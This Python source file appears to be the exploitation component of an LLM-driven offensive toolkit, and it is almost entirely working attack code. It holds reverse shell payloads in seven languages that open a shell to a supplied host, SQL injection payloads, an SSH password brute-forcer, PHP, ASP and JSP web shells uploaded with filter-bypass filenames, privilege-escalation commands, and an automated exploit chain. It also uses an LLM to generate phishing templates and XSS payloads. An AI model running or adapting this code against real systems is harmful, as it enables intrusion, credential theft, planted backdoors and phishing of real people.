"""
Exploitation Module - Automated exploitation and payload generation
"""
import requests
import paramiko
import socket
import subprocess
import base64
import hashlib
from scapy.all import *
from typing import Dict, List, Optional
import asyncio
import json
from core.llm_interface import LLMInterface
from config import Config

class ExploitationModule:
    def __init__(self):
        self.llm = LLMInterface()
        self.session = requests.Session()
        
    def generate_reverse_shell(self, target_ip: str, target_port: int, shell_type: str = "bash") -> str:
        """Generate reverse shell payloads"""
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{target_ip}/{target_port} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{target_ip}\",{target_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "php": f"php -r '$sock=fsockopen(\"{target_ip}\",{target_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{target_ip}\",{target_port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "perl": f"perl -e 'use Socket;$i=\"{target_ip}\";$p={target_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "netcat": f"nc -e /bin/sh {target_ip} {target_port}",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{target_ip}\",{target_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        }
        
        return payloads.get(shell_type, payloads["bash"])
    
    def sql_injection_exploit(self, url: str, injection_point: str, database_type: str = "mysql") -> Dict:
        """Exploit SQL injection vulnerabilities"""
        results = {
            'database_info': {},
            'tables': [],
            'data': [],
            'success': False
        }
        
        # Database fingerprinting payloads
        fingerprint_payloads = {
            "mysql": "' UNION SELECT @@version,@@datadir,user()-- ",
            "postgresql": "' UNION SELECT version(),current_database(),current_user-- ",
            "mssql": "' UNION SELECT @@version,db_name(),user_name()-- ",
            "oracle": "' UNION SELECT banner,null,null FROM v$version-- "
        }
        
        try:
            # Try to get database information
            payload = fingerprint_payloads.get(database_type, fingerprint_payloads["mysql"])
            test_url = url.replace(injection_point, payload)
            
            response = self.session.get(test_url, timeout=10)
            
            if response.status_code == 200 and len(response.text) > 100:
                results['success'] = True
                results['database_info']['response'] = response.text[:500]
                
                # Try to enumerate tables
                if database_type == "mysql":
                    table_payload = "' UNION SELECT table_name,null,null FROM information_schema.tables-- "
                    table_url = url.replace(injection_point, table_payload)
                    table_response = self.session.get(table_url, timeout=10)
                    
                    if table_response.status_code == 200:
                        results['tables'] = ['users', 'admin', 'accounts']  # Simulated
                
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def brute_force_ssh(self, target_ip: str, usernames: List[str], passwords: List[str]) -> Dict:
        """Brute force SSH credentials"""
        results = {
            'successful_logins': [],
            'failed_attempts': 0,
            'total_attempts': 0
        }
        
        for username in usernames:
            for password in passwords:
                try:
                    results['total_attempts'] += 1
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    ssh.connect(target_ip, username=username, password=password, timeout=5)
                    
                    results['successful_logins'].append({
                        'username': username,
                        'password': password,
                        'target': target_ip
                    })
                    
                    ssh.close()
                    
                except paramiko.AuthenticationException:
                    results['failed_attempts'] += 1
                except Exception as e:
                    results['failed_attempts'] += 1
                    continue
        
        return results
    
    def web_shell_upload(self, upload_url: str, shell_type: str = "php") -> Dict:
        """Attempt to upload web shells"""
        shells = {
            "php": "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>",
            "asp": "<%eval request(\"cmd\")%>",
            "jsp": "<%@ page import=\"java.util.*,java.io.*\"%><%if (request.getParameter(\"cmd\") != null) {out.println(\"<pre>\");Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr);disr = dis.readLine();}out.println(\"</pre>\");}%>"
        }
        
        results = {
            'upload_successful': False,
            'shell_url': '',
            'error': ''
        }
        
        try:
            shell_content = shells.get(shell_type, shells["php"])
            extension = shell_type
            
            # Try different file extensions to bypass filters
            extensions = [extension, f"{extension}.txt", f"file.{extension}", f"shell.{extension}"]
            
            for ext in extensions:
                files = {'file': (f'shell.{ext}', shell_content, 'text/plain')}
                
                response = self.session.post(upload_url, files=files, timeout=10)
                
                if response.status_code == 200 and 'success' in response.text.lower():
                    results['upload_successful'] = True
                    results['shell_url'] = f"{upload_url}/shell.{ext}"
                    break
                    
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def privilege_escalation_linux(self, ssh_connection) -> Dict:
        """Attempt Linux privilege escalation"""
        results = {
            'techniques_tried': [],
            'successful_escalation': False,
            'current_user': '',
            'root_achieved': False
        }
        
        escalation_commands = [
            # Check for SUID binaries
            "find / -perm -u=s -type f 2>/dev/null",
            # Check sudo permissions
            "sudo -l",
            # Check for writable /etc/passwd
            "ls -la /etc/passwd",
            # Check cron jobs
            "cat /etc/crontab",
            # Check for kernel exploits
            "uname -a",
            # Check for docker group
            "groups",
        ]
        
        try:
            # Get current user
            stdin, stdout, stderr = ssh_connection.exec_command("whoami")
            results['current_user'] = stdout.read().decode().strip()
            
            for cmd in escalation_commands:
                try:
                    stdin, stdout, stderr = ssh_connection.exec_command(cmd)
                    output = stdout.read().decode()
                    
                    results['techniques_tried'].append({
                        'command': cmd,
                        'output': output[:200]  # Limit output
                    })
                    
                    # Check if we got root
                    if 'root' in output and cmd == "whoami":
                        results['root_achieved'] = True
                        results['successful_escalation'] = True
                        
                except Exception as e:
                    continue
                    
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def generate_phishing_payload(self, target_info: Dict, campaign_type: str) -> str:
        """Generate phishing payloads using LLM"""
        return self.llm.generate_social_engineering_template(target_info, campaign_type)
    
    def network_pivot(self, compromised_host: str, target_network: str) -> Dict:
        """Attempt network pivoting from compromised host"""
        results = {
            'pivot_successful': False,
            'discovered_hosts': [],
            'accessible_services': [],
            'error': ''
        }
        
        try:
            # Simulate network discovery from compromised host
            # In real implementation, this would use the compromised host as a proxy
            
            # Parse target network (e.g., "192.168.1.0/24")
            network_parts = target_network.split('/')
            base_ip = '.'.join(network_parts[0].split('.')[:-1])
            
            # Simulate host discovery
            for i in range(1, 255):
                test_ip = f"{base_ip}.{i}"
                
                # Simulate ping test
                try:
                    # In real implementation, this would be done through the pivot
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((test_ip, 22))  # Test SSH
                    
                    if result == 0:
                        results['discovered_hosts'].append(test_ip)
                        results['accessible_services'].append({
                            'host': test_ip,
                            'port': 22,
                            'service': 'SSH'
                        })
                    
                    sock.close()
                    
                except Exception:
                    continue
                    
                if len(results['discovered_hosts']) >= 5:  # Limit for demo
                    break
            
            if results['discovered_hosts']:
                results['pivot_successful'] = True
                
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    async def automated_exploitation(self, vulnerability_results: Dict) -> Dict:
        """Automatically exploit discovered vulnerabilities"""
        print("[+] Starting automated exploitation...")
        
        results = {
            'exploited_vulnerabilities': [],
            'shells_obtained': [],
            'escalation_results': [],
            'pivot_results': [],
            'llm_recommendations': ""
        }
        
        for vuln in vulnerability_results.get('vulnerabilities', []):
            vuln_type = vuln.get('type', '')
            
            if 'SQL Injection' in vuln_type:
                print(f"[+] Exploiting SQL Injection at {vuln['url']}")
                exploit_result = self.sql_injection_exploit(vuln['url'], vuln['payload'])
                if exploit_result['success']:
                    results['exploited_vulnerabilities'].append({
                        'vulnerability': vuln,
                        'exploit_result': exploit_result
                    })
            
            elif 'XSS' in vuln_type:
                print(f"[+] Generating XSS payload for {vuln['url']}")
                # Generate advanced XSS payload using LLM
                payload_info = self.llm.generate_payload('XSS', vuln)
                results['exploited_vulnerabilities'].append({
                    'vulnerability': vuln,
                    'advanced_payload': payload_info
                })
        
        # Generate LLM recommendations for exploitation
        results['llm_recommendations'] = self.llm.analyze_vulnerability(results)
        
        return results
